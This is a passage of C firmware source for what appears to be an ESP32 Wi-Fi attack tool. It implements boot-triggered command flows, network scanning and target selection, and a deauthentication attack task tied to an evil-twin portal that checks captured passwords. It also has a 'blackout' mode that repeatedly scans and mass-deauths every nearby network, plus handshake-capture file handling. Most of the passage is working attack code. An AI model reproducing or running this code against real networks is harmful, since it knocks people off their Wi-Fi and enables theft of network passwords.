    }

    size_t required = 0;
    err = nvs_get_str(handle, BOOTCFG_KEY_SHORT_CMD, NULL, &required);
    if (err == ESP_OK && required > 0 && required <= BOOTCFG_CMD_MAX_LEN) {
        err = nvs_get_str(handle, BOOTCFG_KEY_SHORT_CMD, boot_config.short_press.command, &required);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "Boot cfg short cmd read failed: %s", esp_err_to_name(err));
        } else if (boot_validate_command_flow(boot_config.short_press.command, NULL, 0) != BOOT_FLOW_VALID) {
            ESP_LOGW(TAG, "Boot cfg short flow not allowed (%s), resetting", boot_config.short_press.command);
            strlcpy(boot_config.short_press.command, "start_sniffer_dog", sizeof(boot_config.short_press.command));
        }
    }

    required = 0;
    err = nvs_get_str(handle, BOOTCFG_KEY_LONG_CMD, NULL, &required);
    if (err == ESP_OK && required > 0 && required <= BOOTCFG_CMD_MAX_LEN) {
        err = nvs_get_str(handle, BOOTCFG_KEY_LONG_CMD, boot_config.long_press.command, &required);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "Boot cfg long cmd read failed: %s", esp_err_to_name(err));
        } else if (boot_validate_command_flow(boot_config.long_press.command, NULL, 0) != BOOT_FLOW_VALID) {
            ESP_LOGW(TAG, "Boot cfg long flow not allowed (%s), resetting", boot_config.long_press.command);
            strlcpy(boot_config.long_press.command, "start_blackout", sizeof(boot_config.long_press.command));
        }
    }

    nvs_close(handle);
}

static void boot_config_print(void) {
    MY_LOG_INFO(TAG, "boot_short_status=%s", boot_config.short_press.enabled ? "on" : "off");
    MY_LOG_INFO(TAG, "boot_short=%s", boot_config.short_press.command);
    MY_LOG_INFO(TAG, "boot_long_status=%s", boot_config.long_press.enabled ? "on" : "off");
    MY_LOG_INFO(TAG, "boot_long=%s", boot_config.long_press.command);
}

static void boot_list_allowed_commands(void) {
    MY_LOG_INFO(TAG, "Allowed boot commands:");
    for (size_t i = 0; i < boot_allowed_command_count; i++) {
        MY_LOG_INFO(TAG, "  %s", boot_allowed_commands[i]);
    }
    MY_LOG_INFO(TAG, "Use commas to run a flow, for example:");
    MY_LOG_INFO(TAG, "  list_sd, select_html 1, start_portal FreeWifi");
    MY_LOG_INFO(TAG, "Quote arguments that contain spaces:");
    MY_LOG_INFO(TAG, "  start_portal \"Free Wifi\"");
}

static bool boot_execute_command_segment(char *command_line, void *ctx) {
    (void)ctx;

    char parse_copy[BOOTCFG_CMD_MAX_LEN];
    if (strlcpy(parse_copy, command_line, sizeof(parse_copy)) >= sizeof(parse_copy)) {
        return false;
    }

    char *argv_local[16];
    size_t argc = esp_console_split_argv(parse_copy, argv_local, sizeof(argv_local) / sizeof(argv_local[0]));
    if (argc == 0) {
        return false;
    }

    const char *run_line = command_line;
    if (strcasecmp(argv_local[0], "packet_monitor") == 0 && argc == 1) {
        // Keep backward compatibility with the previous fixed channel=1 behavior.
        run_line = "packet_monitor 1";
    }

    MY_LOG_INFO(TAG, "Boot cmd: %s", run_line);

    int cmd_ret = 0;
    esp_err_t err = esp_console_run(run_line, &cmd_ret);
    if (err == ESP_ERR_NOT_FOUND) {
        MY_LOG_INFO(TAG, "Boot cmd not found: %s", argv_local[0]);
        return false;
    }
    if (err == ESP_ERR_INVALID_ARG) {
        MY_LOG_INFO(TAG, "Boot cmd invalid args: %s", run_line);
        return false;
    }
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Boot cmd error %s: %s", esp_err_to_name(err), run_line);
        return false;
    }
    if (cmd_ret != 0) {
        MY_LOG_INFO(TAG, "Boot cmd returned %d: %s", cmd_ret, run_line);
        return false;
    }

    return true;
}

static void boot_execute_command_flow(const char* flow) {
    if (flow == NULL || flow[0] == '\0') {
        return;
    }

    char flow_copy[BOOTCFG_CMD_MAX_LEN];
    if (strlcpy(flow_copy, flow, sizeof(flow_copy)) >= sizeof(flow_copy)) {
        MY_LOG_INFO(TAG, "Boot flow too long, skipping");
        return;
    }

    char detail[BOOTCFG_CMD_MAX_LEN];
    boot_flow_validation_result_t validation = boot_validate_command_flow(flow, detail, sizeof(detail));
    if (validation == BOOT_FLOW_INVALID_COMMAND) {
        MY_LOG_INFO(TAG, "Boot flow blocked by command '%s'", detail);
        return;
    }
    if (validation != BOOT_FLOW_VALID) {
        MY_LOG_INFO(TAG, "Boot flow malformed: %s", flow);
        return;
    }

    if (!boot_visit_command_flow(flow_copy, boot_execute_command_segment, NULL)) {
        MY_LOG_INFO(TAG, "Boot flow stopped: %s", flow);
    }
}

static void boot_action_task(void *arg) {
    boot_action_params_t *params = (boot_action_params_t *)arg;
    if (params != NULL) {
        boot_execute_command_flow(params->command);
        free(params);
    }
    boot_action_task_handle = NULL;
    vTaskDelete(NULL);
}

static void boot_handle_action(bool is_long_press) {
    const boot_action_config_t* action = is_long_press ? &boot_config.long_press : &boot_config.short_press;
    const char* label = is_long_press ? "long" : "short";
    if (!action->enabled) {
        MY_LOG_INFO(TAG, "Boot %s action disabled", label);
        return;
    }
    char detail[BOOTCFG_CMD_MAX_LEN];
    boot_flow_validation_result_t validation = boot_validate_command_flow(action->command, detail, sizeof(detail));
    if (validation == BOOT_FLOW_INVALID_COMMAND) {
        MY_LOG_INFO(TAG, "Boot %s command '%s' not allowed", label, detail);
        return;
    }
    if (validation != BOOT_FLOW_VALID) {
        MY_LOG_INFO(TAG, "Boot %s flow malformed: %s", label, action->command);
        return;
    }
    MY_LOG_INFO(TAG, "Boot %s executing: %s", label, action->command);
    if (boot_action_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Boot %s action busy, skipping '%s'", label, action->command);
        return;
    }

    boot_action_params_t *params = calloc(1, sizeof(*params));
    if (params == NULL) {
        MY_LOG_INFO(TAG, "Boot %s action failed: no memory", label);
        return;
    }
    strlcpy(params->command, action->command, sizeof(params->command));

    BaseType_t result = xTaskCreate(
        boot_action_task,
        "boot_action",
        BOOT_ACTION_TASK_STACK_SIZE,
        params,
        BOOT_BUTTON_TASK_PRIORITY,
        &boot_action_task_handle
    );
    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Boot %s action failed: task create", label);
        boot_action_task_handle = NULL;
        free(params);
    }
}

static void ensure_vendor_file_checked(void) {
    if (vendor_file_checked) {
        return;
    }
    if (!sd_card_mounted) {
        // SD card not ready yet, defer lookup until later
        vendor_file_checked = false;
        vendor_file_present = false;
        vendor_record_count = 0;
        return;
    }
    FILE *file = fopen(SD_OUI_BIN_PATH, "rb");
    if (file) {
        vendor_file_present = true;
        if (fseek(file, 0, SEEK_END) == 0) {
            long file_size = ftell(file);
            if (file_size >= (long)VENDOR_RECORD_SIZE) {
                vendor_record_count = (size_t)file_size / VENDOR_RECORD_SIZE;
            } else {
                vendor_record_count = 0;
            }
        } else {
            vendor_record_count = 0;
        }
        MY_LOG_INFO(TAG, "Vendor binary file detected (%u entries)", (unsigned int)vendor_record_count);
        fclose(file);
        if (vendor_record_count == 0) {
            vendor_file_present = false;
        }
    } else {
        vendor_file_present = false;
        vendor_record_count = 0;
        MY_LOG_INFO(TAG, "Vendor binary file not found");
    }
    vendor_file_checked = true;
    vendor_last_valid = false;
    vendor_last_hit = false;
    vendor_lookup_buffer[0] = '\0';
}

static const char* lookup_vendor_name(const uint8_t *bssid) {
    if (!vendor_lookup_enabled || !bssid) {
        vendor_last_valid = false;
        return NULL;
    }

    if (vendor_last_valid && memcmp(vendor_last_oui, bssid, 3) == 0) {
        return vendor_last_hit ? vendor_lookup_buffer : NULL;
    }

    ensure_vendor_file_checked();
    if (!vendor_file_present) {
        vendor_last_valid = false;
        return NULL;
    }

    FILE *file = fopen(SD_OUI_BIN_PATH, "rb");
    if (!file) {
        vendor_file_present = false;
        vendor_file_checked = false;
        vendor_last_valid = false;
        return NULL;
    }

    if (vendor_record_count == 0) {
        fclose(file);
        vendor_last_valid = false;
        return NULL;
    }

    size_t low = 0;
    size_t high = vendor_record_count;
    uint8_t record[VENDOR_RECORD_SIZE];
    bool found = false;
    while (low < high) {
        size_t mid = low + (high - low) / 2;
        long offset = (long)(mid * VENDOR_RECORD_SIZE);
        if (fseek(file, offset, SEEK_SET) != 0) {
            break;
        }
        if (fread(record, 1, VENDOR_RECORD_SIZE, file) != VENDOR_RECORD_SIZE) {
            break;
        }

        int cmp = memcmp(record, bssid, 3);
        if (cmp == 0) {
            uint8_t name_len = record[3];
            if (name_len > VENDOR_RECORD_NAME_BYTES) {
                name_len = VENDOR_RECORD_NAME_BYTES;
            }
            memcpy(vendor_lookup_buffer, &record[4], name_len);
            vendor_lookup_buffer[name_len] = '\0';
            memcpy(vendor_last_oui, bssid, 3);
            vendor_last_valid = true;
            vendor_last_hit = true;
            found = true;
            break;
        } else if (cmp < 0) {
            low = mid + 1;
        } else {
            high = mid;
        }
    }

    fclose(file);
    if (found) {
        return vendor_lookup_buffer;
    }

    memcpy(vendor_last_oui, bssid, 3);
    vendor_last_valid = true;
    vendor_last_hit = false;
    vendor_lookup_buffer[0] = '\0';
    return NULL;
}


static void print_network_csv(int index, const wifi_ap_record_t* ap) {
    char escaped_ssid[64];
    escape_csv_field((const char*)ap->ssid, escaped_ssid, sizeof(escaped_ssid));
    char escaped_vendor[64];
    const char *vendor_name = vendor_is_enabled() ? lookup_vendor_name(ap->bssid) : NULL;
    escape_csv_field(vendor_name ? vendor_name : "", escaped_vendor, sizeof(escaped_vendor));
    
    MY_LOG_INFO(TAG, "\"%d\",\"%s\",\"%s\",\"%02X:%02X:%02X:%02X:%02X:%02X\",\"%d\",\"%s\",\"%d\",\"%s\"",
                (index + 1),
                escaped_ssid,
                escaped_vendor,
                ap->bssid[0], ap->bssid[1], ap->bssid[2],
                ap->bssid[3], ap->bssid[4], ap->bssid[5],
                ap->primary,
                authmode_to_string(ap->authmode),
                ap->rssi,
                ap->primary <= 14 ? "2.4GHz" : "5GHz");
    vTaskDelay(pdMS_TO_TICKS(50));
}



static void print_scan_results(void) {
    //MY_LOG_INFO(TAG,"Index  RSSI  Auth  Channel  BSSID              SSID");
    for (int i = 0; i < g_scan_count; ++i) {
        wifi_ap_record_t *ap = &g_scan_results[i];
        // MY_LOG_INFO(TAG,"%5d  %4d  %4d  %5d  %02X:%02X:%02X:%02X:%02X:%02X  %s",
        //        i, ap->rssi, ap->authmode, ap->primary,
        //        ap->bssid[0], ap->bssid[1], ap->bssid[2],
        //        ap->bssid[3], ap->bssid[4], ap->bssid[5],
        //        (const char*)ap->ssid);
        // MY_LOG_INFO(TAG, "%-6d %-16s %02X:%02X:%02X:%02X:%02X:%02X   %-2d   %-4d   %s",
        //     (i+1),
        //     (const char*)ap->ssid,
        //     ap->bssid[0], ap->bssid[1], ap->bssid[2],
        //     ap->bssid[3], ap->bssid[4], ap->bssid[5],
        //     ap->primary,
        //     ap->rssi,
        //     ap->primary <= 14 ? "2.4GHz" : "5GHz");

        print_network_csv(i, ap);

    }
    MY_LOG_INFO(TAG, "Scan results printed.");
}

// --- OLED display helper functions ---

/**
 * Build a target summary for OLED line2.
 * 0 selected → "  No target"
 * 1 selected → ">> HomeNet"
 * 2 selected → ">> Net1, Net2"
 * 3+ selected → ">> Net1 +2 more"
 */
static void oled_build_target_summary(char *buf, size_t sz)
{
    if (g_selected_count == 0 || !g_scan_done) {
        snprintf(buf, sz, "  No target");
        return;
    }
    const char *first = (const char *)g_scan_results[g_selected_indices[0]].ssid;
    if (g_selected_count == 1) {
        snprintf(buf, sz, ">> %s", first);
    } else if (g_selected_count == 2) {
        const char *second = (const char *)g_scan_results[g_selected_indices[1]].ssid;
        snprintf(buf, sz, ">> %s, %s", first, second);
    } else {
        snprintf(buf, sz, ">> %s +%d more", first, g_selected_count - 1);
    }
}

/**
 * Build channel/auth info for OLED line3 from selected networks.
 * Single: "  Ch 6 WPA2 -45dB"
 * Multi:  "  Ch 1,6,11"
 */
static void oled_build_channel_info(char *buf, size_t sz)
{
    if (g_selected_count == 0 || !g_scan_done) {
        buf[0] = '\0';
        return;
    }
    if (g_selected_count == 1) {
        const wifi_ap_record_t *ap = &g_scan_results[g_selected_indices[0]];
        const char *auth = authmode_to_string(ap->authmode);
        snprintf(buf, sz, "  Ch %d %s %ddB", ap->primary, auth, ap->rssi);
    } else {
        int len = snprintf(buf, sz, "  Ch ");
        for (int i = 0; i < g_selected_count && len < (int)sz - 4; i++) {
            const wifi_ap_record_t *ap = &g_scan_results[g_selected_indices[i]];
            if (i > 0) len += snprintf(buf + len, sz - len, ",");
            len += snprintf(buf + len, sz - len, "%d", ap->primary);
        }
    }
}

// --- CLI: commands ---
static int cmd_scan_networks(int argc, char **argv) {
    (void)argc; (void)argv;
    oled_display_update_full("> Scanning WiFi", "  All channels", "", "  Working...");
    log_memory_info("scan_networks");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    if (wardrive_active || wardrive_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Wardrive is active. Use 'stop' to stop it first before scanning.");
        return 1;
    }

    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    // Set LED (ignore errors if LED is in invalid state)
    esp_err_t led_err = led_set_color(0, 255, 0);
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for scan: %s", esp_err_to_name(led_err));
    }

    esp_err_t err = start_background_scan(g_scan_min_channel_time, g_scan_max_channel_time);
    
    if (err != ESP_OK) {
        // Return LED to idle when scan failed
        led_err = led_set_idle();
        if (led_err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to restore idle LED after scan failure: %s", esp_err_to_name(led_err));
        }
        
        if (err == ESP_ERR_INVALID_STATE) {
            MY_LOG_INFO(TAG, "Scan already in progress. Use 'show_scan_results' to see current results or 'stop' to cancel.");
        } else {
            ESP_LOGE(TAG, "Failed to start scan: %s", esp_err_to_name(err));
        }
        return 1;
    }
    
    g_scan_start_time_us = esp_timer_get_time();
    MY_LOG_INFO(TAG, "Background scan started (min: %u ms, max: %u ms per channel)", 
                (unsigned int)g_scan_min_channel_time, (unsigned int)g_scan_max_channel_time);
    return 0;
}

static int cmd_show_scan_results(int argc, char **argv) {
    (void)argc; (void)argv;
    
    if (g_scan_in_progress) {
        MY_LOG_INFO(TAG, "Scan still in progress... Please wait.");
        return 0;
    }
    
    if (!g_scan_done) {
        MY_LOG_INFO(TAG, "No scan has been performed yet. Use 'scan_networks' first.");
        return 0;
    }
    
    if (g_scan_count == 0) {
        MY_LOG_INFO(TAG, "No networks found in last scan.");
        return 0;
    }
    
    MY_LOG_INFO(TAG, "Showing results from last scan (%u networks found):", g_scan_count);
    print_scan_results();
    return 0;
}

static int cmd_select_networks(int argc, char **argv) {
    // Display will be updated after selection is done
    if (argc < 2) {
        ESP_LOGW(TAG,"Syntax: select_networks <index1> [index2] ...");
        return 1;
    }

    // Wait for scan to finish to avoid selecting with empty results
    if (g_scan_in_progress) {
        MY_LOG_INFO(TAG, "Scan in progress - waiting to finish before selecting networks...");
        int wait_loops = 0;
        // wait up to ~10s (100ms * 100) for scan to complete
        while (g_scan_in_progress && wait_loops < 100) {
            vTaskDelay(pdMS_TO_TICKS(100));
            wait_loops++;
        }
    }

    // If still no results, abort selection
    if (!g_scan_done || g_scan_count == 0) {
        ESP_LOGW(TAG,"No scan results yet. Run scan_networks and wait for completion.");
        return 1;
    }

    g_selected_count = 0;
    for (int i = 1; i < argc && g_selected_count < MAX_AP_CNT; ++i) {
        int idx = atoi(argv[i]);
        idx--;//because flipper app uses indexes from 1
        if (idx < 0 || idx >= (int)g_scan_count) {
            ESP_LOGW(TAG,"Index %d out of bounds (0..%u)", idx, g_scan_count ? (g_scan_count - 1) : 0);
            continue;
        }
        g_selected_indices[g_selected_count++] = idx;
    }
    if (g_selected_count == 0) {
        ESP_LOGW(TAG,"First, run scan_networks.");
        return 1;
    }

    char buf[500];
    int len = snprintf(buf, sizeof(buf), "Selected Networks:\n");

    for (int i = 0; i < g_selected_count; ++i) {
        const wifi_ap_record_t* ap = &g_scan_results[g_selected_indices[i]];
        
        // I assume auth is available as a string in your structure, if not - replace with appropriate field or string.
        const char* auth = authmode_to_string(ap->authmode);

        // Formatting: SSID, BSSID, Channel, Auth
        len += snprintf(buf + len, sizeof(buf) - len, "%s, %02x:%02x:%02x:%02x:%02x:%02x, Ch%d, %s%s\n",
                        (char*)ap->ssid,
                        ap->bssid[0], ap->bssid[1], ap->bssid[2],
                        ap->bssid[3], ap->bssid[4], ap->bssid[5],
                        ap->primary, auth,
                        (i + 1 == g_selected_count) ? "" : "");
    }

    vTaskDelay(pdMS_TO_TICKS(100));
    MY_LOG_INFO(TAG, "%s", buf);
    vTaskDelay(pdMS_TO_TICKS(100));

    // Update OLED with rich target summary
    {
        char oled_l1[20];
        snprintf(oled_l1, sizeof(oled_l1), "> %d Target%s", g_selected_count, g_selected_count > 1 ? "s" : "");
        char oled_target[48];
        oled_build_target_summary(oled_target, sizeof(oled_target));
        char oled_ch[32];
        oled_build_channel_info(oled_ch, sizeof(oled_ch));
        oled_display_update_full(oled_l1, oled_target, oled_ch, "  > ready");
    }

    return 0;
}

static int cmd_unselect_networks(int argc, char **argv) {
    (void)argc; (void)argv;
    
    // Stop all running operations
    cmd_stop(0, NULL);
    
    // Clear network selection (but keep scan results)
    g_selected_count = 0;
    memset(g_selected_indices, 0, sizeof(g_selected_indices));
    
    MY_LOG_INFO(TAG, "Network selection cleared. Scan results preserved.");
    return 0;
}

static int cmd_select_stations(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: select_stations <MAC1> [MAC2] ...");
        MY_LOG_INFO(TAG, "Example: select_stations AA:BB:CC:DD:EE:FF 11:22:33:44:55:66");
        return 1;
    }
    
    if (selected_stations == NULL) {
        MY_LOG_INFO(TAG, "PSRAM not initialized for stations");
        return 1;
    }
    
    // Clear previous selection
    selected_stations_count = 0;
    memset(selected_stations, 0, MAX_SELECTED_STATIONS * sizeof(selected_station_t));
    
    // Parse MAC addresses
    for (int i = 1; i < argc && selected_stations_count < MAX_SELECTED_STATIONS; i++) {
        uint8_t mac[6];
        if (sscanf(argv[i], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6) {
            memcpy(selected_stations[selected_stations_count].mac, mac, 6);
            selected_stations[selected_stations_count].active = true;
            selected_stations_count++;
            MY_LOG_INFO(TAG, "Added station: %02X:%02X:%02X:%02X:%02X:%02X",
                       mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        } else {
            MY_LOG_INFO(TAG, "Invalid MAC format: %s (use AA:BB:CC:DD:EE:FF)", argv[i]);
        }
    }
    
    MY_LOG_INFO(TAG, "Selected %d station(s) for targeted deauth", selected_stations_count);
    return 0;
}

static int cmd_unselect_stations(int argc, char **argv) {
    (void)argc; (void)argv;
    selected_stations_count = 0;
    if (selected_stations != NULL) {
        memset(selected_stations, 0, MAX_SELECTED_STATIONS * sizeof(selected_station_t));
    }
    MY_LOG_INFO(TAG, "Station selection cleared. Deauth will use broadcast.");
    return 0;
}

int onlyDeauth = 0;

// Deauth attack task function (runs in background)
static void deauth_attack_task(void *pvParameters) {
    (void)pvParameters;
    
    //Main loop of deauth frames sending:
    while (deauth_attack_active && 
           ((applicationState == DEAUTH) || (applicationState == DEAUTH_EVIL_TWIN) || (applicationState == EVIL_TWIN_PASS_CHECK))) {
        // Check for stop request (check at start of loop for faster response)
        if (operation_stop_requested || !deauth_attack_active) {
            MY_LOG_INFO(TAG, "Deauth attack: Stop requested, terminating...");
            operation_stop_requested = false;
            deauth_attack_active = false;
            applicationState = IDLE;
            
            // Clean up after attack (ignore LED errors)
            esp_err_t led_err = led_set_idle();
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to restore idle LED after deauth stop: %s", esp_err_to_name(led_err));
            }
            
            break;
        }
        
        // Check if it's time for channel monitoring (every 5 minutes)
        // Only perform periodic re-scan during active deauth attacks (DEAUTH and DEAUTH_EVIL_TWIN)
        if ((applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) && check_channel_changes()) {
            // Set flag to suppress logs during periodic re-scan
            periodic_rescan_in_progress = true;
            
            if (applicationState == DEAUTH) {
                oled_display_update_full("> Deauth Attack", "  Re-scanning...", "  Channel check", "  Please wait");
            }
            
            // Set LED to yellow during re-scan
            esp_err_t led_err = led_set_color(255, 255, 0); // Yellow
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to set LED for periodic scan: %s", esp_err_to_name(led_err));
            }
            
            // Temporarily pause deauth for scanning
            esp_err_t scan_result = quick_channel_scan();
            if (scan_result != ESP_OK) {
                MY_LOG_INFO(TAG, "Quick channel re-scan failed: %s", esp_err_to_name(scan_result));
            }
            
            // Clear LED after re-scan (ignore errors if LED is in invalid state)
            led_err = led_clear();
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to clear LED after periodic scan: %s", esp_err_to_name(led_err));
            }
            
            // Clear flag after re-scan completes
            periodic_rescan_in_progress = false;
        }
        
        if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) {
            // Send deauth frames (silent mode - no UART spam)
            ESP_ERROR_CHECK(led_set_color(0, 0, 255));
            wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
            ESP_ERROR_CHECK(led_clear());
        }
        
        // Real-time OLED status update (rate-limited ~500ms)
        {
            static int64_t deauth_oled_last_us = 0;
            static int deauth_oled_rotate = 0;
            int64_t now_us = esp_timer_get_time();
            if (now_us - deauth_oled_last_us > 500000 && target_bssid_count > 0) {
                deauth_oled_last_us = now_us;
                if (applicationState == DEAUTH) {
                    int idx = deauth_oled_rotate % target_bssid_count;
                    char l2[64], l3[64], l4[64];
                    snprintf(l2, sizeof(l2), ">> %s", target_bssids[idx].ssid);
                    snprintf(l3, sizeof(l3), "  Ch %d  [%d/%d]", target_bssids[idx].channel, idx + 1, target_bssid_count);
                    if (selected_stations_count > 0) {
                        snprintf(l4, sizeof(l4), "  STA:%02X:%02X:%02X",
                                 selected_stations[0].mac[3], selected_stations[0].mac[4], selected_stations[0].mac[5]);
                    } else {
                        snprintf(l4, sizeof(l4), "  Deauthing...");
                    }
                    oled_display_update_full("> Deauth Attack", l2, l3, l4);
                    deauth_oled_rotate++;
                } else if (applicationState == DEAUTH_EVIL_TWIN) {
                    char l2[64], l4[64];
                    snprintf(l2, sizeof(l2), ">> %s", target_bssids[0].ssid);
                    if (last_password_wrong) {
                        snprintf(l4, sizeof(l4), "  Clients: %d", portal_connected_clients);
                        oled_display_update_full("> Evil Twin", l2, "  Wrong password!", l4);
                    } else {
                        snprintf(l4, sizeof(l4), "  Clients: %d", portal_connected_clients);
                        oled_display_update_full("> Evil Twin", l2, "  Portal active", l4);
                    }
                } else if (applicationState == EVIL_TWIN_PASS_CHECK) {
                    char l2[64], l4[64];
                    snprintf(l2, sizeof(l2), ">> %s", evilTwinSSID ? evilTwinSSID : "?");
                    snprintf(l4, sizeof(l4), "  Attempt %d/3", connectAttemptCount + 1);
                    oled_display_update_full("> Evil Twin", l2, "  Connecting...", l4);
                }
            }
        }
        
        // Delay and yield to allow UART console processing
        vTaskDelay(pdMS_TO_TICKS(100));
        taskYIELD(); // Give other tasks (including console) a chance to run
    }
    
    // Clean up LED after attack finishes naturally (ignore LED errors)
    esp_err_t led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED after deauth task: %s", esp_err_to_name(led_err));
    }
    
    deauth_attack_active = false;
    deauth_attack_task_handle = NULL;
    
    // DO NOT clear target BSSIDs when attack ends - keep them for potential restart
    // target_bssid_count = 0;
    // memset(target_bssids, 0, MAX_TARGET_BSSIDS * sizeof(target_bssid_t));
    
    MY_LOG_INFO(TAG,"Deauth attack task finished.");
    
    vTaskDelete(NULL); // Delete this task
}

// Blackout attack task function (runs in background)
static void blackout_attack_task(void *pvParameters) {
    (void)pvParameters;
    
    MY_LOG_INFO(TAG, "Blackout attack task started.");
    
    // Set LED to orange for blackout attack
    esp_err_t led_err = led_set_color(255, 165, 0); // Orange
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for blackout attack start: %s", esp_err_to_name(led_err));
    }
    
    // Main loop: continuously scan and attack for 3 minutes each cycle
    while (blackout_attack_active && !operation_stop_requested) {
        MY_LOG_INFO(TAG, "Starting blackout cycle: scanning all networks...");
        oled_display_update_full("> Blackout Mode", "  Scanning...", "  Finding nets", "  Please wait");
        
        // Start background scan with fast timings
        esp_err_t scan_result = start_background_scan(FAST_SCAN_MIN_TIME, FAST_SCAN_MAX_TIME);
        if (scan_result != ESP_OK) {
            MY_LOG_INFO(TAG, "Failed to start scan: %s", esp_err_to_name(scan_result));
            vTaskDelay(pdMS_TO_TICKS(1000)); // Wait 1 second before retry
            continue;
        }
        
        // Wait for scan to complete (dynamic timeout based on channel times)
        int timeout = 0;
        int timeout_limit = get_scan_timeout_iterations();
        while (g_scan_in_progress && timeout < timeout_limit && blackout_attack_active && !operation_stop_requested) {
            vTaskDelay(pdMS_TO_TICKS(100));
            timeout++;
        }
        
        if (operation_stop_requested) {
            MY_LOG_INFO(TAG, "Blackout attack: Stop requested during scan, terminating...");
            break;
        }
        
        if (g_scan_in_progress) {
            MY_LOG_INFO(TAG, "Scan taking longer than expected, waiting for completion...");
            // Wait additional time for scan to complete naturally (30s max)
            int extra_wait = 0;
            while (g_scan_in_progress && extra_wait < 300 && blackout_attack_active && !operation_stop_requested) {
                vTaskDelay(pdMS_TO_TICKS(100));
                extra_wait++;
            }
            // If still in progress after extra wait, then stop
            if (g_scan_in_progress) {
                MY_LOG_INFO(TAG, "Scan still in progress, forcing stop...");
                esp_wifi_scan_stop();
                g_scan_in_progress = false;
                vTaskDelay(pdMS_TO_TICKS(500));
                continue;
            }
        }
        
        if (!g_scan_done || g_scan_count == 0) {
            MY_LOG_INFO(TAG, "No scan results available, retrying...");
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        MY_LOG_INFO(TAG, "Found %d networks, sorting by channel...", g_scan_count);
        
        // Sort networks by channel (ascending order)
        for (int i = 0; i < g_scan_count - 1; i++) {
            for (int j = 0; j < g_scan_count - i - 1; j++) {
                if (g_scan_results[j].primary > g_scan_results[j + 1].primary) {
                    wifi_ap_record_t temp = g_scan_results[j];
                    g_scan_results[j] = g_scan_results[j + 1];
                    g_scan_results[j + 1] = temp;
                }
            }
        }
        
        // Set all networks as selected for attack
        g_selected_count = g_scan_count;
        for (int i = 0; i < g_selected_count; i++) {
            g_selected_indices[i] = i;
        }
        
        // Save target BSSIDs for deauth attack
        save_target_bssids();
        
        MY_LOG_INFO(TAG, "Starting deauth attack on  %d networks (except whitelist) for 100 cycles...", g_selected_count);
        
        {
            char bo_l2[64];
            snprintf(bo_l2, sizeof(bo_l2), "  Found %d nets", g_selected_count);
            oled_display_update_full("> Blackout Mode", bo_l2, "  Mass deauth", "  Starting...");
        }
        
        // Attack all networks for exactly 3 minutes (1800 cycles at 100ms each)
        int attack_cycles = 0;
        const int MAX_ATTACK_CYCLES = 100;
        
        while (attack_cycles < MAX_ATTACK_CYCLES && blackout_attack_active && !operation_stop_requested) {
            // Flash LED during attack (orange)
            esp_err_t led_err = led_set_color(255, 165, 0); // Orange
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to set LED during blackout attack: %s", esp_err_to_name(led_err));
            }
            
            // Send deauth frames to all networks
            wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
            
            // Clear LED briefly
            led_err = led_clear();
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to clear LED during blackout attack: %s", esp_err_to_name(led_err));
            }
            
            if (attack_cycles % 5 == 0 && target_bssid_count > 0) {
                int idx = attack_cycles % target_bssid_count;
                char bo_l2[64], bo_l3[64], bo_l4[64];
                snprintf(bo_l2, sizeof(bo_l2), ">> %s", target_bssids[idx].ssid);
                snprintf(bo_l3, sizeof(bo_l3), "  %d nets Cyc%d", g_selected_count, attack_cycles);
                snprintf(bo_l4, sizeof(bo_l4), "  Ch %d Active", target_bssids[idx].channel);
                oled_display_update_full("> Blackout Mode", bo_l2, bo_l3, bo_l4);
            }
            
            attack_cycles++;
            vTaskDelay(pdMS_TO_TICKS(100)); // 100ms delay between attack cycles
        }
        
        if (operation_stop_requested) {
            MY_LOG_INFO(TAG, "Blackout attack: Stop requested during attack, terminating...");
            break;
        }
        
        MY_LOG_INFO(TAG, "3-minute attack cycle completed, starting new scan...");
        oled_display_update_full("> Blackout Mode", "  Cycle done", "  New scan...", "");
        
        // Immediately start next scan cycle (no waiting)
    }
    
    // Clean up LED after attack finishes
    led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED after blackout attack: %s", esp_err_to_name(led_err));
    }
    
    // Clean up
    blackout_attack_active = false;
    blackout_attack_task_handle = NULL;
    
    // Clear target BSSIDs
    target_bssid_count = 0;
    memset(target_bssids, 0, MAX_TARGET_BSSIDS * sizeof(target_bssid_t));
    
    MY_LOG_INFO(TAG, "Blackout attack task finished.");
    
    vTaskDelete(NULL); // Delete this task
}

// Helper function to check if handshake file already exists for a given SSID
static bool check_handshake_file_exists(const char *ssid) {
    char ssid_safe[33];
    
    // Sanitize SSID for filename
    strncpy(ssid_safe, ssid, sizeof(ssid_safe) - 1);
    ssid_safe[sizeof(ssid_safe) - 1] = '\0';
    for (int i = 0; ssid_safe[i]; i++) {
        if (ssid_safe[i] == ' ' || ssid_safe[i] == '/' || ssid_safe[i] == '\\') {
            ssid_safe[i] = '_';
        }
    }
    
    // Check if any PCAP file exists for this SSID
    DIR *dir = opendir("/sdcard/lab/handshakes");
    if (dir == NULL) {
